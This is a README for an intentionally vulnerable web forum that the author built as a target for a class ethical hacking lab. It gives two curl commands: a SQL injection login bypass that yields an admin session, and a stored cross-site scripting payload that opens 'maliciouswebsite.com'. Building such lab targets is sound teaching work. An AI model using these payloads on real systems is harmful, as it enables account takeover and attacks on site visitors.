# Vulnerable Forum
This is a vulnerable web forum to act as dummy application to be the punching bag for whilst doing my ethical hacking lab for class.

## Attack

Get an admin session via SQL injection. 
```shell
curl -X POST localhost:4567/login -d "username=' or ''='&password=' or ''='" --cookie "cookies.txt" --cookie-jar "cookies.txt"
```

Store some malicious JS.
```shell
curl -X POST localhost:4567/posts -d "title=Hacked&content=<script>window.open('maliciouswebsite.com');</script>" --cookie "cookies.txt" --cookie-jar "cookies.txt"
```

???

Profit.

## License

The gem is available as open source under the terms of the [MIT License](http://opensource.org/licenses/MIT).
